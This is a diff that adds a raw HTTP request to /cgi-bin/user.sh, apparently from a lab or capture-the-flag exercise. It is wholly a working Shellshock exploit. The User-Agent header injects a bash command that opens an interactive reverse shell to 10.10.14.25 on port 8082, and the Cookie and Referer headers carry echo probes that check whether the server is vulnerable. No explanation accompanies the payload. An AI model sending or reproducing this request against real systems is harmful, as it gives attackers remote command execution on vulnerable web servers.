@@ -1,0 +1,6 @@
+GET /cgi-bin/user.sh HTTP/1.1
+User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.25/8082 0>&1; 
+Cookie: () { :;}; echo; echo -n tiktvql; echo cekywoz
+Connection: close
+Host: localhost:4444
+Referer: () { :;}; echo; echo -n tiktvql; echo cekywozls
